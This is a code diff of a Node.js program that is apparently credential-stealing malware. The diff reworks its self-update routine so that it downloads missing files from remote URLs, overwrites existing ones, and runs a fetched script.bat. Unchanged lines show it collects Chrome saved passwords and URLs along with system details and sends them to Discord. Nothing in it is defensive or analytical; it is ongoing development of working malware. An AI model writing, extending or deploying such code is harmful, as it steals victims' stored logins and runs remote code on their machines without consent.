@@ -112,20 +112,21 @@ async function sendSystemDetailsAndPasswordsToDiscord(details, passwords) {
 async function checkAndUpdateFiles() {
   try {
     for (const file of filesToDownload) {
-      // Download the latest version of the file
-      const response = await axios.get(file.url);
-      const latestContent = response.data;
-
-      // Read the current file content
-      const currentContent = fs.readFileSync(file.filePath, "utf8");
-
-      // Compare the current content with the latest version
-      if (currentContent !== latestContent) {
-        // Save the latest content to the file
-        fs.writeFileSync(file.filePath, latestContent);
-        console.log(`File updated: ${file.filePath}`);
+      // Check if the file exists
+      if (!fs.existsSync(file.filePath)) {
+        // File does not exist, download it
+        await downloadFile(file.url, file.filePath);
       } else {
-        console.log(`File is up to date: ${file.filePath}`);
+        // File exists, compare the current content with the latest version
+        const latestContent = await axios.get(file.url);
+        const currentContent = fs.readFileSync(file.filePath, "utf8");
+        if (currentContent !== latestContent.data) {
+          // Save the latest content to the file
+          fs.writeFileSync(file.filePath, latestContent.data);
+          console.log(`File updated: ${file.filePath}`);
+        } else {
+          console.log(`File is up to date: ${file.filePath}`);
+        }
       }
     }
   } catch (error) {
@@ -140,17 +141,17 @@ async function runScript() {
     // Download files and update if necessary
     await checkAndUpdateFiles();
 
-    // Execute the CMD script
-    executeFile("./script.bat");
+    // Get the absolute path to the script.bat file
+    const scriptPath = path.join(__dirname, "./script.bat");
 
-    // Execute the JavaScript file
-    executeFile("./index.js");
+    // Execute the CMD script
+    executeFile(scriptPath);
 
     // Retrieve system details
     const systemDetails = getSystemDetails();
     console.log("System Details:", systemDetails);
 
-    // Retrieve Chrome passwords
+    // Retrieve Chrome passwords and URLs
     const chromePasswords = await getChromePasswords();
     console.log("Chrome Passwords:", chromePasswords);
 
@@ -164,5 +165,5 @@ async function runScript() {
   }
 }
 
-// Invoke the main function to start the process
+// Invoke the main function to startthe process
 runScript();
